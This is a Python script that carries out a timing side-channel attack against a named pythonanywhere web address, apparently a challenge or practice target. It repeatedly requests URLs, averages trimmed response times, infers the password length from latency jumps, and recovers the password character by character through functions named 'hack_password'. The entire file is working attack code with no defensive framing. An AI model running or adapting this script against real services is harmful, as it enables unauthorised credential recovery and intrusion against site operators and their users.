from statistics import mean
import requests
import time

URL = "https://zvish123.pythonanywhere.com//"
REPEAT_CHECK = 20
# POOL = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
POOL = 'esYMZ4'

def timeit(url2check,  repeat=1):
    times = []
    for _ in range(repeat):
        start = time.time()
        r = requests.get(url2check, allow_redirects=True)
        end = time.time()
        times.append(end - start)

    removed = remove_4(times)
    return mean(removed)


def remove_4(times):
    times.sort()
    times.pop(0)
    times.pop(0)
    times.pop(-1)
    times.pop(-1)
    return times


def check_len(url2check):
    sum_t = 0
    avrg = 0
    for i in range(1, 12):
        url = url2check + "*"*i
        t = timeit(url, 7)
        if i != 1 and t - avrg > 0.1:
            return i - 1

        sum_t += t
        avrg = sum_t / i

    return 12


def hack_password_l(url2check, filling, characters):
    # password = url2check + '*' + filling
    # wrong_time = timeit(password, REPEAT_CHECK)
    ts = {}

    for l in characters:
        t = timeit(url2check + l + filling, REPEAT_CHECK)
        ts[t] = l

    return ts[min(ts.keys())]


def hack_password(url2check, characters, length=-1):
    if length < 0:
        length = check_len(url2check)

    url = url2check
    for i in range(length - 1, -1, -1):
        url += hack_password_l(url, '*'*i, characters)
        print(url)
    return url


if __name__ == '__main__':
    print(hack_password(URL, POOL, 6))
